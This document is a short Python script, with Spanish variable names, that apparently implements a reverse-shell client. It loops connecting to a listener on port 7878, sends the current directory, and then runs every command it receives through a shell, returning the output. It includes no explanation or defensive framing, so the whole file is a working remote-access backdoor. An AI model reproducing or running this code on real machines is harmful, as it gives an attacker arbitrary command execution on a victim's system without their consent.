import socket
import os
import subprocess
import time
import platform

name = socket.gethostname()


def connection():
    while True:
        time.sleep(5)
        try:
            cliente.connect(("0.0.0.0",7878))
            terminal()
        except:
            connection()

def terminal():
    directorio = os.getcwd()
    cliente.send(directorio.encode())

    while True:
        recibo = cliente.recv(1024)
        if recibo.decode() == "exit":
            break
        else:
            sub = subprocess.Popen(recibo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = sub.stderr.read()+sub.stdout.read()
            cliente.send(output)
            try:
                if recibo[:2].decode('utf-8') == 'cd':
                   os.chdir(recibo[3:].decode('utf-8'))
                   cliente.send("listo".encode())
            except:
                cliente.send('error al acceder'.encode())
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()
